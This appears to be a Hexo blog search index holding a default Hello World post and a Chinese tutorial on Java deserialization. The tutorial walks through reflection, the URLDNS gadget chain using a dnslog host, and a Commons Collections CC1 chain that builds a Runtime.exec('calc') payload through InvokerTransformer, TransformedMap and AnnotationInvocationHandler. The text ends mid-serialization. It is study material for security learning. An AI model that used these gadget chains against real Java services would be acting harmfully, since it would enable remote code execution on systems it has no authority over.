<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2023/07/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>java 反序列化</title>
    <url>/0202/03/26/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<p>补一下之前写的文章，系统的总结一下，同时也改一下之前的错误。</p>
<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>我这里也不弄什么解释了，简单说一下我自己的想法，对象可以通过反射可以得到类，类可以通过反射得到方法，然后可以执行方法。</p>
<h3 id="反射里极为重要的方法："><a href="#反射里极为重要的方法：" class="headerlink" title="反射里极为重要的方法："></a>反射里极为重要的方法：</h3><p>获取类的方法：<code>forName</code></p>
<p>实例化类对象的方法：<code>newInstance</code></p>
<p>获取函数的方法：<code>getMethod</code></p>
<p>执行函数的方法：<code>invoke</code></p>
<p>​	<code>invoke</code> 的作用是执行方法，它的第一个参数是：<br>​		如果这个方法是一个普通方法，那么第一个参数是类对象<br>​		如果这个方法是一个静态方法，那么第一个参数是类</p>
<p><img src="/images/image-20220321153340208.png" alt="image-20220321153340208"></p>
<p>下面写一个简单的demo来试试反射</p>
<p><img src="/images/image-20220321180645046.png" alt="image-20220321180645046"></p>
<p>可以看到和上面差不多只是在<code>getMethod</code>中多了一个String.class，这是为什么呢，<code>getMethod</code> 的作用是通过反射获取一个类的某个特定的公有方法。而学过Java的同学应该清楚，Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用<code>getMethod</code> 的时候，我们需要传给他你需要获取的函数的参数类型列表，然后由于想执行的方法是exec，而exec需要我们传入参数，最简单的是一个String类型的参数。这里可能就有疑问了，为什么刚才写的没有加呢，因为刚才那个我们没有参数，所以不用写。<img src="/images/image-20220321180839260.png" alt="image-20220321180839260"></p>
<p>然后执行一下，会发现报错，因为我们使用的Runtime的构造方法是私有的，无法用<code>newInstance()</code>来获取，但是能通过<code>Runtime.getRuntime()</code> 来获取到Runtime 对象。我们只需要把<code>newInstance</code>改成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20220321181718415.png" alt="image-20220321181718415"></p>
<p>成功执行。这里是一点套娃的感觉。然后分解一下上面的代码。</p>
<p><img src="/images/image-20220321182608608.png" alt="image-20220321182608608"></p>
<p>正常执行方法是 <code>[1].method([2], [3], [4]...)</code> ，其实在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code></p>
<p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法我们使用<code>getConstructor</code>来实例化该类。这里我们用ProcessBuilder来演示一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ProcessBuilder exec= new ProcessBuilder(&quot;calc&quot;);</span><br><span class="line">exec.start();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;))).start();//但是这里用到了强制转换，我们也需要通过反射的方法来实现</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20220321205731451.png" alt="image-20220321205731451"></p>
<p>通过<code>getMethod(&quot;start&quot;)</code> 获取到start方法，然后invoke 执行，<code>invoke</code> 的第一个参数就是<br>ProcessBuilder Object了。</p>
<p>如果一个方法或构造方法是私有方法就需要我们使用<code>getDeclared</code> 系列的反射，这里涉及到和<code>getMethod</code>的区别了。</p>
<ul>
<li><code>getMethod</code>系列方法获取的是当前类中的所有公共方法，包括从父类继承的方法。</li>
<li><code>getDeclaredMethod</code> 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</li>
</ul>
<p>之前由于Runtime的构造方法是私有的，我们只能用<code>clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz)</code>来实现构造，现在我们可以直接用<code>getDeclaredConstructor</code> 来获取这个私有的构造方法来实例化对象</p>
<p><img src="/images/image-20220321211244593.png" alt="image-20220321211244593"></p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>​	跟着p牛的思路走根据<code>ysoserial</code>来分析一下这个链子如何使用</p>
<p><img src="/images/image-20220321213135089.png" alt="image-20220321213135089"></p>
<p>咱们分成两段，先看看hashCode()怎么触发DNS请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class dnsurl &#123;</span><br><span class="line">    public static void main(String[] args) throws MalformedURLException&#123;</span><br><span class="line">        String url=&quot;http://3fiurr.dnslog.cn&quot;;</span><br><span class="line">        URL URL= new URL(url);</span><br><span class="line">        URL.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进去</p>
<p><img src="/images/image-20220321232250561.png" alt="image-20220321232250561"></p>
<p>点进getHostAddress()康康</p>
<p><img src="/images/image-20220321233843015.png" alt="image-20220321233843015"></p>
<p>可以看到获取<code>host</code>的地址从而触发了DNS请求。然后我们在yso看一下上半部分如何通过Hashmap调用到URL.hashCode的</p>
<p><img src="/images/image-20220322000441786.png" alt="image-20220322000441786"></p>
<p>Hashmap跟进去看一下readObject调用 putVal<img src="/images/image-20220322000601890.png" alt="image-20220322000601890"></p>
<p>看到会调用hash进去</p>
<p><img src="/images/image-20220322000718889.png" alt="image-20220322000718889"></p>
<p>看到hashcode完事了串起来了</p>
<ol>
<li>HashMap-&gt;readObject()<ol start="2">
<li>HashMap-&gt;hash()<ol start="3">
<li>URL-&gt;hashCode()<ol start="4">
<li>URLStreamHandler-&gt;hashCode()<ol start="5">
<li>URLStreamHandler-&gt;getHostAddress()<ol start="6">
<li>InetAddress-&gt;getByName()</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p><img src="/images/image-20220322220621769.png" alt="image-20220322220621769"></p>
<p>可以看到请求了这个url<img src="/images/image-20220322220657269.png" alt="image-20220322220657269"></p>
<p>大家如果看过Yso是怎么写的会发现他多了<img src="/images/image-20220322220902716.png" alt="image-20220322220902716"></p>
<p>这些东西，这里咱们是想利用反序列化，不希望他在我们构造的时候就有回显，于是就重写<code>getHostAddress()</code>方法，防止了<code>put</code>时候的触发。</p>
<p><img src="/images/image-20220322222422229.png" alt="image-20220322222422229"></p>
<p>当然还有个值得注意的地方就是，这里需要改为-1</p>
<p><img src="/images/image-20220322222903836.png" alt="image-20220322222903836"></p>
<p>由于我们改写了getHostAddress但是还是会计算哈希值，就不等于-1了，所以我们还需要更改hashCode的属性这样反序列列化时将会重新计算其hashCode ，才能触发到后⾯面的DNS请求，但是由于hashCode的属性是private</p>
<p>在yso里面是这样解释的</p>
<p><code>During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</code></p>
<p>咱们怎么实现呢，这就需要我们之前的反射来实现</p>
<p><img src="/images/image-20220322224637035.png" alt="image-20220322224637035"></p>
<p><img src="/images/image-20220322224818737.png" alt="image-20220322224818737"></p>
<p>到此结束</p>
<p><a href="https://ego00.blog.csdn.net/article/details/119678492?spm=1001.2014.3001.5502">Java反序列化]URLDNS链学习_bfengj的博客-CSDN博客</a></p>
<p><a href="https://ha1c9on.top/?p=1932#urldns">JAVA反序列化 – Ha1c9on</a></p>
<p>P神的《Java安全漫谈 》</p>
<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>学习CC</p>
<h5 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h5><p>这里我们需要了解一下东西</p>
<h6 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h6><p>Transformer是一个接口，它只有一个待实现的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h6><p>TransformedMap用于对Java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时，将可<br>以执行一个回调。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorates another &lt;code&gt;Map&lt;/code&gt; to transform objects that are added.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The Map put methods and Map.Entry setValue method are affected by this class.</span></span><br><span class="line"><span class="comment"> * Thus objects must be removed or searched for using their transformed form.</span></span><br><span class="line"><span class="comment"> * For example, if the transformation converts Strings to Integers, you must</span></span><br><span class="line"><span class="comment"> * use the Integer form to remove objects.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This class is Serializable from Commons Collections 3.1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.11 $ $Date: 2004/06/07 22:14:42 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br></pre></td></tr></table></figure>

<p>这里是利用他里面的decorate() 至于为什么一会咱们再说，咱先记着</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a transforming map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the map being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h6><p>然后是ConstantTransformer实现了Transformer接口的一个类，它的过程就是在构造函数的时候传入一个<br>对象，并在transform方法将这个对象再返回。他的作用其实就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> constantToReturn  the constant to return each time</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the constant.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the constant</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h6 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h6><p>这个我们的关键，看名字就知道这是一个实现反射的Transformer</p>
<p>在实例化这个InvokerTransformer时，需要传入三个参数，第一个参数是待执行的方法名，第二个参数<br>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。这玩意写的就和后门一样，可以看到里面就是我们之前提到的反射实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h6><p>ChainedTransformer也是实现了Transformer接口的一个类，它的作用是将内部的多个Transformer串<br>在一起。</p>
<ul>
<li><pre><code class="java">/**
 
 * Constructor that performs no validation.
 * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.
 * 
 * @param transformers  the transformers to chain, not copied, no nulls
*/
public ChainedTransformer(Transformer[] transformers) &#123;
super();
iTransformers = transformers;
&#125;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> /**</span><br><span class="line"></span><br><span class="line">  * Transforms the input to result via each decorated transformer</span><br><span class="line">  * </span><br><span class="line">  * @param object  the input object passed to the first transformer</span><br><span class="line">  * @return the transformed result</span><br><span class="line">    */</span><br><span class="line">    public Object transform(Object object) &#123;</span><br><span class="line">    for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> ```java</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">记住刚才的四个Transformer我们开始了</span><br><span class="line"></span><br><span class="line">咱们先从InvokerTransformer开始</span><br><span class="line"></span><br><span class="line">写一个dome先了解他是怎么用的</span><br><span class="line"></span><br><span class="line">![image-20220327015552460](images\image-20220327015552460.png)</span><br><span class="line"></span><br><span class="line">如果你知道理解反射的话仔细阅读一下InvokerTransformer就应该 大概明白是什么意思了，就是将我们之前的反射用InvokerTransformer封装起来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后我们需要用ChainedTransformer将上面的Transformer链接在一起方便执行</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">Transformer[]transformers=new Transformer[]&#123;</span><br><span class="line">    new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                           new Class[]&#123;String.class,  Class[].class&#125;,</span><br><span class="line">                           new Object[]&#123;&quot;getRuntime&quot; , null&#125;),</span><br><span class="line">    new InvokerTransformer(&quot;invoke&quot;,   </span><br><span class="line">                           new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                           new Object[]&#123;  null       , null&#125;),</span><br><span class="line">    new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                           new Class[]&#123;String.class&#125;,</span><br><span class="line">                           new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>这些只是一系列回调，我们需要用其来包装InvokerTransformer，让他可以串起来，现在问题就到了，谁会自动去调用我们已经封装好的ChainedTransformer里面的InvokerTransformer.transform（）</p>
<p><img src="/images/image-20220327022835535.png" alt="image-20220327022835535"></p>
<p>我们可以看到在LazyMap和TransformedMap里面均调用了InvokerTransformer.Transformer</p>
<p><img src="/images/image-20220327023010081.png" alt="image-20220327023010081"></p>
<h5 id="TransformedMap实现"><a href="#TransformedMap实现" class="headerlink" title="TransformedMap实现"></a>TransformedMap实现</h5><p>我们先看TransformedMap里面的checkSetValue。如果valueTransformer是怎么传入的</p>
<p><img src="/images/image-20220327023234207.png" alt="image-20220327023234207"></p>
<p>继续向上找发现<img src="/images/image-20220327023316305.png" alt="image-20220327023316305"></p>
<p>在TransformedMap的decorate可以控制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[]transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,  Class[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,   </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  <span class="literal">null</span>       , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>现在我们的dome变成了这样，这里我们如果看一下会发现</p>
<p><img src="/images/image-20220327030834613.png" alt="image-20220327030834613"></p>
<p>map的值不能为空，于是我们在put进去一个值</p>
<p>现在回到checkSetValue看一下哪里会调用它<img src="/images/image-20220327023816235.png" alt="image-20220327023816235"></p>
<p>我们在这里人为测试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[]transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,  Class[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,   </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  <span class="literal">null</span>       , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(chainedTransformer);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>是可以成功的，现在是问题到了在那里调用setValue，我们当然希望是希望出现在readObject里面</p>
<p>继续向上找，最后是发现了<img src="/images/image-20220327025204615.png" alt="image-20220327025204615"></p>
<p>在AnnotationInvocationHandler的readObject里面发现可以调用和控制这样就串起来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[]transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,  Class[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,   </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  <span class="literal">null</span>       , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(chainedTransformer);</span><br><span class="line">        &#125;</span><br><span class="line">Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor annotationInvocationHandler=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object o=annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"><span class="type">byte</span>[] bytes = serialize(o);</span><br><span 